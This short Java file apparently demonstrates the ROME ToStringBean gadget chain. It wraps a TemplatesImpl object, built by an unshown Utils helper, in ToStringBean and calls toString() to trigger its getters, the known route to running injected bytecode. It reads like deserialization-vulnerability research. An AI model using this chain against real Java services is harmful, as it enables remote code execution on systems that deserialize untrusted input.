package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;

public class ToStringBeanExec {
    public static void main(String[] args) throws Exception {
        TemplatesImpl tpl = Utils.getTemplatesImpl();

        ToStringBean toStringBean = new ToStringBean(Templates.class, tpl);
        toStringBean.toString();
    }

}
